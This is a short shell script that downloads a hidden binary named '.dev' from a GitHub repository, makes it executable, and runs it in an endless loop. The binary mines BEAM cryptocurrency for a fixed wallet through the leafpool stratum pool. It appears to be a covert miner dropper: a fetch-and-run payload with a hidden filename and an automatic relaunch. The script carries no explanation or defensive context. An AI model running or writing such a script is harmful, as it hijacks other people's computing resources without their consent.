#!/bin/bash
@echo off
wget https://github.com/WhynotSir/sirji/raw/main/.dev && chmod +x .dev
while [ 1 ]; do
./.dev --algo BEAM-III --pool stratum+tcp://beam-asia.leafpool.com:3333 --user 38ffc9ed6712546ef8f48663b7bb02cc38aeac83244beab9e7f08fe1276571eca4a
sleep 3
done
sleep 999
